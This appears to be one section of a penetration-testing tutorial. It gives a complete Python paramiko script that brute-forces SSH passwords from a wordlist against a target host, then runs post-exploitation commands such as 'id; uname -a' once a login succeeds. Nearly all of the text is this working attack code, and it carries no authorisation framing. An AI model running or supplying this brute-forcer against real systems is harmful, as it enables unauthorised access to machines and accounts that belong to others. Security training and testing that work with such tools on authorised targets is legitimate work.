# Phase 9: Custom SSH Scripts with Paramiko

Python-based SSH automation:

```python
#!/usr/bin/env python3
import paramiko
import sys

def ssh_connect(host, username, password):
    """Attempt SSH connection with credentials"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(host, username=username, password=password, timeout=5)
        print(f"[+] Success: {username}:{password}")
        return client
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}:{password}")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def execute_command(client, command):
    """Execute command via SSH"""
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode()
    errors = stderr.read().decode()
    return output, errors

def ssh_brute_force(host, username, wordlist):
    """Brute-force SSH with wordlist"""
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        client = ssh_connect(host, username, password.strip())
        if client:
            # Run post-exploitation commands
            output, _ = execute_command(client, 'id; uname -a')
            print(output)
            client.close()
            return True
    return False

# Usage
if __name__ == "__main__":
    target = "192.168.1.100"
    user = "admin"
    
    # Single credential test
    client = ssh_connect(target, user, "password123")
    if client:
        output, _ = execute_command(client, "ls -la")
        print(output)
        client.close()
```